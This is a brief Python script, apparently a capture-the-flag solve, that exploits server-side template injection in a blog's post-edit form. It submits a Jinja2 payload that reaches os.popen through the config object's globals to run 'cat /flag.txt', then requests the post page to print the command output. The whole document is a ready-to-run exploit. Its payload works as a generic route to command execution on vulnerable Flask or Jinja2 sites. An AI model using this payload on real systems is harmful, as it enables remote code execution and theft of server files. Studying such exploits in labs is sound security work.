import urllib.request
import urllib.parse

edit_url = "http://yoursite/edit/5"
view_url = "http://yoursite/post/5"
payload = "{{ config.__class__.__init__.__globals__.os.popen('cat /flag.txt').read() }}"

data = urllib.parse.urlencode({
    "title": "Post 5",
    "content": payload
}).encode("utf-8")

req = urllib.request.Request(edit_url, data=data, method="POST")
req.add_header("Content-Type", "application/x-www-form-urlencoded")

with urllib.request.urlopen(req) as resp:
    resp.read()

view_req = urllib.request.Request(view_url)
with urllib.request.urlopen(view_req) as resp:
    print(resp.read().decode("utf-8"))
